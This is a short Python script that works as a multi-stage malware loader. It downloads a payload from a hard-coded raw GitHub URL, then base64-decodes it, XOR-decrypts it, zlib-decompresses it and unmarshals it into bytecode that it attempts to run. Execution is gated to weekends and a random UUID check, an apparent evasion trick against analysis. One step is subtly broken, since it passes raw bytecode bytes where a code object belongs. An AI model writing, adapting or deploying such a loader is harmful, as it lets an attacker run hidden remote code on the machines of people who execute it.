import base64
import marshal
import zlib
import types
import uuid
import time
import requests

def xor(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def allow_exec() -> bool:
    now = time.localtime()
    # Only allow on Saturday(5) or Sunday(6), and some UUID first-char filter
    return now.tm_wday in [5, 6] and str(uuid.uuid4())[0] in "abcdef"

def fetch_payload() -> bytes:
    url = "https://raw.githubusercontent.com/damidami4321/lol/refs/heads/main/payload.txt"
    resp = requests.get(url, timeout=5)
    resp.raise_for_status()
    return resp.content

def run_bytecode_indirectly(code_obj):
    # Convert code object to function and call it
    func = types.FunctionType(code_obj.co_code, {})
    func()

def multi_stage_loader(blob: bytes):
    decoded = base64.b64decode(blob)
    key, encrypted = decoded[:8], decoded[8:]
    unxored = xor(encrypted, key)
    decompressed = zlib.decompress(unxored)
    code_obj = marshal.loads(decompressed)
    run_bytecode_indirectly(code_obj)

def main():
    if allow_exec():
        try:
            blob = fetch_payload()
            multi_stage_loader(blob)
        except Exception as e:
            print(f"Loader error: {e}")
    else:
        print("Execution conditions not met.")

if __name__ == "__main__":
    main()
